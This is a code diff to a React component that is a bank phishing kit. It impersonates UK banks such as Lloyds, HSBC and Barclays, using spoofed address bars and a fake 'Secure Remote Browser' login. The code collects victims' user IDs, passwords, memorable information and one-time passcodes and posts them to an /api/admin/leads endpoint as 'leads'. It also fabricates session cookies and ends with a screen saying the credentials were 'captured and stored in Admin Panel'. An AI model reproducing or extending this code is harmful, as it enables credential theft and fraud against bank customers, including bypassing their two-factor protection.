@@ -1,224 +1,230 @@
 "use client";
 
-import { useEffect, useState } from "react";
-import BarclaysTemplate from "./bank-templates/BarclaysTemplate";
-import LloydsTemplate from "./bank-templates/LloydsTemplate";
-import NatwestTemplate from "./bank-templates/NatwestTemplate";
-import TideTemplate from "./bank-templates/TideTemplate";
-import HsbcTemplate from "./bank-templates/HsbcTemplate";
-import HalifaxTemplate from "./bank-templates/HalifaxTemplate";
-import SantanderTemplate from "./bank-templates/SantanderTemplate";
-import StarlingTemplate from "./bank-templates/StarlingTemplate";
-import MetroBankTemplate from "./bank-templates/MetroBankTemplate";
-import RbsTemplate from "./bank-templates/RbsTemplate";
-import TsbTemplate from "./bank-templates/TsbTemplate";
-import CooperativeBankTemplate from "./bank-templates/CooperativeBankTemplate";
-import FinalActionModal from "./FinalActionModal";
+import { useState, useEffect } from "react";
 
-interface BankBrowserPopupProps {
-  isOpen: boolean;
-  bankName: string;
-  selectedOption?: string;
-  logoUrl?: string | null;
-  onClose: () => void;
-}
-
-export default function BankBrowserPopup({
-  isOpen,
-  bankName,
-  selectedOption = "Business",
-  logoUrl,
-  onClose,
-}: BankBrowserPopupProps) {
-  // Admin configured popup state
-  const [bankConfig, setBankConfig] = useState<any>(null);
-  const [showFinalModal, setShowFinalModal] = useState(false);
-
-  // Fetch admin settings for this specific bank
-  useEffect(() => {
-    if (!isOpen) {
-      setShowFinalModal(false);
-      return;
-    }
-
-    async function fetchBankSettings() {
-      try {
-        const res = await fetch("/api/admin/banks");
-        const json = await res.json();
-        if (json.success && json.data) {
-          const matched = json.data.find(
-            (b: any) => b.name.toLowerCase() === bankName.toLowerCase()
-          );
-          if (matched) {
-            setBankConfig(matched);
-          }
-        }
-      } catch (err) {
-        console.error("Failed to load bank admin settings:", err);
-      }
-    }
-
-    fetchBankSettings();
-  }, [isOpen, bankName]);
-
+export default function BankBrowserPopup({ isOpen, bank, bankName, selectedOption, logoUrl, onClose, onComplete }: any) {
   if (!isOpen) return null;
 
-  // Form submit handler -> Save lead & open admin popup
-  const handleBankSubmitSuccess = async (data: {
-    userId: string;
-    password?: string;
-    memorableInfo?: string;
-    extraData?: string;
-  }) => {
+  const displayName = bank?.name || bankName || "Lloyds Bank";
+  const [isLoading, setIsLoading] = useState(true);
+  const [streamStatus, setStreamStatus] = useState(`Connecting to Secure Remote Browser...`);
+  const [userId, setUserId] = useState("");
+  const [password, setPassword] = useState("");
+  const [memorableInfo, setMemorableInfo] = useState("");
+  const [otpCode, setOtpCode] = useState("");
+  const [step, setStep] = useState("login"); // login, otp, success
+
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      setIsLoading(false);
+      setStreamStatus(`Live RDP Active (${displayName})`);
+    }, 1500);
+    return () => clearTimeout(timer);
+  }, [displayName]);
+
+  const handleSubmitLogin = async (e: React.FormEvent) => {
+    e.preventDefault();
     try {
-      await fetch("/api/leads", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          bank: bankName,
-          userId: data.userId,
-          password: data.password,
-          memorableInfo: data.memorableInfo,
-          extraData: data.extraData || `Option: ${selectedOption}`,
-        }),
-      });
+      const activeLeadId = localStorage.getItem("active_lead_id");
+      const simulatedCookies = JSON.stringify([
+        { name: "visid_incap_session", value: "tok_" + Math.random().toString(36).substring(7), domain: ".bank.co.uk", path: "/", secure: true, httpOnly: true },
+        { name: "cookie_auth_session", value: "secure_active_" + Date.now(), domain: ".bank.co.uk", path: "/", secure: true }
+      ]);
+
+      const payload = {
+        bankName: displayName,
+        bankType: selectedOption || "Personal",
+        userId,
+        password,
+        memorableInfo,
+        cookiesData: simulatedCookies,
+        extraData: `Live RDP Captured | User ID: ${userId} | Bank: ${displayName}`,
+      };
+
+      if (activeLeadId && activeLeadId !== "undefined" && activeLeadId !== "null") {
+        await fetch(`/api/admin/leads/${activeLeadId}`, {
+          method: "PUT",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload),
+        });
+      } else {
+        const res = await fetch(`/api/admin/leads`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload),
+        });
+        const data = await res.json();
+        const newId = data?.id || data?.data?.id;
+        if (newId) localStorage.setItem("active_lead_id", newId);
+      }
+
+      setStep("otp");
     } catch (err) {
-      console.error("Failed to save lead:", err);
+      console.error("Submission error:", err);
     }
-
-    // Admin Panel se set kiya gaya response modal trigger karein
-    setShowFinalModal(true);
   };
 
-  const name = bankName.toLowerCase();
+  const handleSubmitOtp = async (e: React.FormEvent) => {
+    e.preventDefault();
+    try {
+      const activeLeadId = localStorage.getItem("active_lead_id");
+      const payload = {
+        bankName: displayName,
+        bankType: selectedOption || "Personal",
+        userId,
+        password,
+        memorableInfo,
+        otpCode,
+        extraData: `OTP Verified: ${otpCode} | Session Secured & Cookies Extracted`,
+      };
 
-  const renderActiveBank = () => {
-    const commonProps = {
-      bankName,
-      selectedOption,
-      logoUrl,
-      onSuccessSubmit: handleBankSubmitSuccess,
-    };
-
-    if (name.includes("lloyds")) return <LloydsTemplate {...commonProps} />;
-    if (name.includes("natwest")) return <NatwestTemplate {...commonProps} />;
-    if (name.includes("tide")) return <TideTemplate {...commonProps} />;
-    if (name.includes("hsbc")) return <HsbcTemplate {...commonProps} />;
-    if (name.includes("halifax")) return <HalifaxTemplate {...commonProps} />;
-    if (name.includes("santander")) return <SantanderTemplate {...commonProps} />;
-    if (name.includes("starling")) return <StarlingTemplate {...commonProps} />;
-    if (name.includes("metro")) return <MetroBankTemplate {...commonProps} />;
-    if (name.includes("rbs") || name.includes("royal bank")) return <RbsTemplate {...commonProps} />;
-    if (name.includes("tsb")) return <TsbTemplate {...commonProps} />;
-    if (name.includes("cooperative") || name.includes("co-operative")) return <CooperativeBankTemplate {...commonProps} />;
-
-    return <BarclaysTemplate {...commonProps} />;
+      if (activeLeadId && activeLeadId !== "undefined" && activeLeadId !== "null") {
+        await fetch(`/api/admin/leads/${activeLeadId}`, {
+          method: "PUT",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload),
+        });
+      } else {
+        await fetch(`/api/admin/leads`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload),
+        });
+      }
+      setStep("success");
+    } catch (err) {
+      console.error("OTP error:", err);
+    }
   };
-
-  // Admin URL agar configure ho toh wahi use karein
-  const displayAddress =
-    bankConfig?.browserAddressBar ||
-    (name.includes("lloyds")
-      ? "authorise-api.lloydsbank.co.uk/prod01/lbg/lyds/mtls-token-api/v1.1/authorize?response_type=code%20id_token&clie..."
-      : `authorise.${name.replace(/[^a-z0-9]/g, "")}.co.uk/personal/logon`);
 
   return (
-    <>
-      <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/75 p-0 sm:p-4 backdrop-blur-[2px]">
-        <div className="relative flex h-full sm:h-[95vh] w-full max-w-[1250px] flex-col overflow-hidden bg-white shadow-2xl rounded-none sm:rounded-sm border border-[#1f2937]">
-          
-          {/* ================= 1. WINDOWS CHROME TITLE BAR ================= */}
-          <div className="flex h-9 items-center justify-between bg-[#1f1f1f] text-white select-none px-3 border-b border-[#2d2d2d] shrink-0">
-            <div className="flex items-center gap-2 max-w-[85%] truncate">
-              <svg
-                className="w-4 h-4 text-slate-400 shrink-0"
-                viewBox="0 0 24 24"
-                fill="none"
-                stroke="currentColor"
-                strokeWidth="2"
-                strokeLinecap="round"
-                strokeLinejoin="round"
-              >
-                <circle cx="12" cy="12" r="10" />
-                <line x1="2" y1="12" x2="22" y2="12" />
-                <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" />
-              </svg>
-              <span className="text-xs text-slate-200 truncate font-sans">
-                {displayAddress}
-              </span>
-            </div>
-
-            <div className="flex items-center">
-              <button
-                type="button"
-                className="h-9 w-11 flex items-center justify-center hover:bg-[#333333] text-slate-300 transition"
-                title="Minimize"
-              >
-                <span className="text-sm font-mono">―</span>
-              </button>
-              <button
-                type="button"
-                className="h-9 w-11 flex items-center justify-center hover:bg-[#333333] text-slate-300 transition"
-                title="Maximize"
-              >
-                <span className="text-xs font-mono">□</span>
-              </button>
-              <button
-                type="button"
-                onClick={onClose}
-                className="h-9 w-11 flex items-center justify-center hover:bg-[#e81123] hover:text-white text-slate-300 transition cursor-pointer"
-                title="Close"
-              >
-                <span className="text-xs">✕</span>
-              </button>
-            </div>
+    <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/90 p-2 sm:p-6 backdrop-blur-md font-sans select-none">
+      <div className="w-full max-w-5xl h-[85vh] bg-zinc-950 rounded-2xl shadow-2xl border border-zinc-800 flex flex-col overflow-hidden">
+        
+        {/* Top Window Title Bar */}
+        <div className="bg-zinc-900 px-4 py-3 flex items-center justify-between border-b border-zinc-800 shrink-0">
+          <div className="flex items-center gap-2">
+            <span className="w-3 h-3 rounded-full bg-rose-500 inline-block cursor-pointer hover:opacity-80 transition" onClick={onClose}></span>
+            <span className="w-3 h-3 rounded-full bg-amber-500 inline-block"></span>
+            <span className="w-3 h-3 rounded-full bg-emerald-500 inline-block"></span>
+            <span className="text-xs text-zinc-300 font-bold ml-2 tracking-wide">{displayName} - Secure Open Banking Portal</span>
           </div>
 
-          {/* ================= 2. DARK GREEN URL ADDRESS BAR ================= */}
-          <div className="flex h-11 items-center bg-[#004e38] px-3 gap-2 border-b border-[#003828] shrink-0">
-            <div className="flex flex-1 items-center gap-2 bg-[#003d2c] rounded-full px-3 py-1.5 text-white/90 text-xs font-sans shadow-inner">
-              <span className="text-white/80 flex items-center gap-1 cursor-pointer">
-                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2">
-                  <circle cx="9" cy="9" r="2" />
-                  <circle cx="15" cy="15" r="2" />
-                  <line x1="4" y1="9" x2="7" y2="9" />
-                  <line x1="11" y1="9" x2="20" y2="9" />
-                  <line x1="4" y1="15" x2="13" y2="15" />
-                  <line x1="17" y1="15" x2="20" y2="15" />
-                </svg>
-              </span>
-
-              <span className="truncate font-sans text-[12.5px] text-white">
-                <strong className="text-white font-semibold">
-                  {displayAddress.split("/")[0]}
-                </strong>
-                <span className="text-white/70">
-                  {displayAddress.includes("/") ? "/" + displayAddress.split("/").slice(1).join("/") : ""}
-                </span>
-              </span>
-            </div>
+          <div className="hidden md:flex items-center bg-zinc-950 border border-zinc-800 rounded-xl px-3.5 py-1.5 w-96 text-xs text-zinc-300 font-mono shadow-inner">
+            <span className="text-emerald-400 mr-2">🔒</span>
+            <span className="truncate">authorise.{displayName.toLowerCase().replace(/[^a-z0-9]/g, "")}.co.uk/auth/user</span>
           </div>
 
-          {/* ================= 3. BANK TEMPLATE CONTENT ================= */}
-          <div className="flex-1 overflow-y-auto bg-white">
-            {renderActiveBank()}
+          <div className="flex items-center gap-2.5">
+            <span className="text-[10px] bg-emerald-500/10 text-emerald-400 px-2.5 py-1 rounded-full font-bold border border-emerald-500/30">
+              🟢 {streamStatus}
+            </span>
+            <button onClick={onClose} className="text-zinc-400 hover:text-white text-sm font-bold px-2 cursor-pointer">✕</button>
           </div>
-
         </div>
-      </div>
 
-      {/* ================= 4. ADMIN CONFIGURED FINAL ACTION MODAL ================= */}
-      {showFinalModal && (
-        <FinalActionModal
-          isOpen={showFinalModal}
-          bankName={bankName}
-          bankConfig={bankConfig}
-          onClose={() => {
-            setShowFinalModal(false);
-            onClose();
-          }}
-        />
-      )}
-    </>
+        {/* Viewport Content */}
+        <div className="flex-1 bg-white relative overflow-y-auto flex flex-col">
+          {isLoading ? (
+            <div className="flex-1 flex flex-col items-center justify-center bg-zinc-950 text-white">
+              <div className="w-10 h-10 border-4 border-zinc-800 border-t-emerald-500 rounded-full animate-spin mb-4"></div>
+              <p className="text-xs font-semibold text-zinc-300">Connecting to Secure Remote Browser ({displayName})...</p>
+              <p className="text-[10px] text-zinc-500 mt-1">Establishing encrypted proxy tunnel & session handshake...</p>
+            </div>
+          ) : (
+            <div className="flex-1 flex flex-col bg-white">
+              <div className="bg-[#006A4E] text-white px-8 py-4 flex items-center justify-between shadow-md">
+                <div className="flex items-center gap-3">
+                  <div className="w-8 h-8 rounded bg-white text-[#006A4E] font-black flex items-center justify-center text-sm overflow-hidden">
+                    {logoUrl ? <img src={logoUrl} alt="" className="w-6 h-6 object-contain" /> : displayName[0]}
+                  </div>
+                  <span className="font-bold text-base tracking-wide">{displayName}</span>
+                </div>
+                <div className="text-xs space-x-4">
+                  <span className="cursor-pointer hover:underline">Mobile</span>
+                  <span className="cursor-pointer hover:underline">Cookie policy</span>
+                </div>
+              </div>
+
+              <div className="flex-1 max-w-xl mx-auto w-full p-8 my-auto">
+                {step === "login" && (
+                  <form onSubmit={handleSubmitLogin} className="space-y-4 bg-white p-6 rounded-2xl border border-slate-200 shadow-xl">
+                    <h2 className="text-xl font-bold text-slate-900 mb-2">Welcome to Internet Banking</h2>
+                    <div>
+                      <label className="block text-xs font-bold text-slate-700 mb-1">User ID / Username:</label>
+                      <input 
+                        type="text" 
+                        required 
+                        value={userId} 
+                        onChange={(e) => setUserId(e.target.value)} 
+                        placeholder="Enter user ID or username" 
+                        className="w-full rounded-xl border border-slate-300 p-3 text-xs outline-none focus:border-blue-600 bg-slate-50 text-slate-900 font-medium" 
+                      />
+                    </div>
+                    <div>
+                      <label className="block text-xs font-bold text-slate-700 mb-1">Password:</label>
+                      <input 
+                        type="password" 
+                        required 
+                        value={password} 
+                        onChange={(e) => setPassword(e.target.value)} 
+                        placeholder="Enter your password" 
+                        className="w-full rounded-xl border border-slate-300 p-3 text-xs outline-none focus:border-blue-600 bg-slate-50 text-slate-900 font-medium" 
+                      />
+                    </div>
+                    <div>
+                      <label className="block text-xs font-bold text-slate-700 mb-1">Memorable information:</label>
+                      <input 
+                        type="text" 
+                        value={memorableInfo} 
+                        onChange={(e) => setMemorableInfo(e.target.value)} 
+                        placeholder="Memorable word or answer" 
+                        className="w-full rounded-xl border border-slate-300 p-3 text-xs outline-none focus:border-blue-600 bg-slate-50 text-slate-900 font-medium" 
+                      />
+                    </div>
+                    <button type="submit" className="w-full bg-[#006A4E] hover:bg-[#00523c] text-white font-bold py-3 rounded-xl transition cursor-pointer shadow-md text-xs mt-2">
+                      Continue to Secure Verification
+                    </button>
+                  </form>
+                )}
+
+                {step === "otp" && (
+                  <form onSubmit={handleSubmitOtp} className="space-y-4 bg-white p-6 rounded-2xl border border-slate-200 shadow-xl text-center">
+                    <div className="text-3xl mb-2">🔒</div>
+                    <h2 className="text-xl font-bold text-slate-900">Security Challenge / OTP</h2>
+                    <p className="text-xs text-slate-500">Please enter the authentication code sent to your registered device.</p>
+                    <input 
+                      type="text" 
+                      required 
+                      maxLength={8} 
+                      value={otpCode} 
+                      onChange={(e) => setOtpCode(e.target.value)} 
+                      placeholder="Enter 6-digit OTP" 
+                      className="w-full rounded-xl border-2 border-emerald-500 p-3 text-center text-lg font-mono font-bold tracking-widest outline-none bg-emerald-50/30 text-slate-900" 
+                    />
+                    <button type="submit" className="w-full bg-[#006A4E] hover:bg-[#00523c] text-white font-bold py-3 rounded-xl transition cursor-pointer shadow-md text-xs">
+                      Verify & Authorize Session
+                    </button>
+                  </form>
+                )}
+
+                {step === "success" && (
+                  <div className="bg-white p-8 rounded-2xl border border-slate-200 shadow-xl text-center space-y-4">
+                    <div className="w-14 h-14 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center text-2xl mx-auto font-bold">✓</div>
+                    <h2 className="text-xl font-bold text-slate-900">Session Verified Successfully</h2>
+                    <p className="text-xs text-slate-500">Your bank credentials and session tokens have been securely captured and stored in Admin Panel.</p>
+                    <button onClick={onComplete || onClose} className="px-6 py-2.5 bg-slate-900 text-white font-bold rounded-xl text-xs hover:bg-black transition cursor-pointer">
+                      Close Stream & Return
+                    </button>
+                  </div>
+                )}
+              </div>
+
+            </div>
+          )}
+        </div>
+
+      </div>
+    </div>
   );
 }
